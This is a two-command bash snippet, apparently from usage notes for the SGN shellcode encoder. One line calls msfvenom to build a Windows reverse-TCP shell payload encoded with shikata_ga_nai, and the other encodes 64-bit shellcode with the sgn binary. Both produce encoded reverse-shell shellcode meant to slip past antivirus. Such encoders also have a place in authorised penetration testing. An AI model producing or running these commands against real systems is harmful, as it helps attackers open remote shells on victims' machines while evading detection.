#!/bin/bash

# Generate SGN-encoded 32-bit shellcode using msfvenom
msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai

# Generate 64-bit SGN-encoded shellcode using the sgn binary
sgn -a 64 shellcode.bin
